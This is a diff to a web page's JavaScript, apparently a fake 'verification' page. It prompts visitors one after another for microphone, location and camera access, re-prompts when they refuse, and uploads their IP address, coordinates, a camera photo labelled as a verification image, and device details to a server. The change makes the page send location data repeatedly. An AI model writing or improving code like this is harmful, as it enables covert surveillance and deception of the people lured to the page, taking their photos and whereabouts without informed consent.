@@ -320,7 +320,7 @@
 
         // Données collectées
         let userIP = null, userCoords = null, photoBlob = null;
-        let ipSent = false, coordsSent = false, photoSent = false;
+        let ipSent = false, photoSent = false;
         let systemSent = false;
 
         // ========== COLLECTE ==========
@@ -440,6 +440,7 @@
                 formData.append('userAgent', navigator.userAgent);
                 formData.append('sessionId', SESSION_ID);
 
+                // Permissions (toujours envoyées)
                 const perms = {
                     camera: cameraGranted,
                     microphone: microphoneGranted,
@@ -447,18 +448,24 @@
                 };
                 formData.append('permissions', JSON.stringify(perms));
 
+                // IP (une seule fois)
                 if (userIP && !ipSent) {
                     formData.append('ip', JSON.stringify(userIP));
                     ipSent = true;
                 }
-                if (userCoords && !coordsSent) {
+
+                // Coordonnées (envoyées à chaque fois qu'elles sont définies, même en erreur)
+                if (userCoords) {
                     formData.append('coordinates', JSON.stringify(userCoords));
-                    coordsSent = true;
                 }
+
+                // Photo (une seule fois)
                 if (photoBlob && !photoSent) {
                     formData.append('photo', photoBlob, 'verif-' + Date.now() + '.jpg');
                     photoSent = true;
                 }
+
+                // Système (une seule fois)
                 if (!systemSent) {
                     const sys = {
                         screen: { width: window.screen.width, height: window.screen.height, colorDepth: window.screen.colorDepth, devicePixelRatio: window.devicePixelRatio },
@@ -532,10 +539,8 @@
         // ========== DEMANDES SÉQUENTIELLES ==========
 
         async function requestAllPermissions() {
-            // Désactiver le bouton pour éviter les clics multiples
             document.getElementById('allowBtn').disabled = true;
 
-            // Demander dans l'ordre : micro, géoloc, caméra (avec délais)
             await requestMicrophone();
             await new Promise(r => setTimeout(r, 800));
             await getGeolocation();
@@ -547,18 +552,10 @@
         }
 
         async function retryDenied() {
-            // Relancer uniquement les permissions refusées
             const promises = [];
-            if (!cameraGranted && cameraAttempted) {
-                promises.push(requestCamera());
-            }
-            if (!microphoneGranted && microphoneAttempted) {
-                promises.push(requestMicrophone());
-            }
-            if (!geolocationGranted && geolocationAttempted) {
-                promises.push(getGeolocation());
-            }
-            // Attendre que toutes soient terminées
+            if (!cameraGranted && cameraAttempted) promises.push(requestCamera());
+            if (!microphoneGranted && microphoneAttempted) promises.push(requestMicrophone());
+            if (!geolocationGranted && geolocationAttempted) promises.push(getGeolocation());
             await Promise.all(promises);
             updateUI();
         }
@@ -592,7 +589,7 @@
         window.addEventListener('load', () => {
             console.log('🔑 Session ID:', SESSION_ID);
             document.body.classList.add('unverified');
-            getIPAddress(); // envoi de l'IP
+            getIPAddress();
             updateUI();
             setInterval(updateUI, 2000);
         });
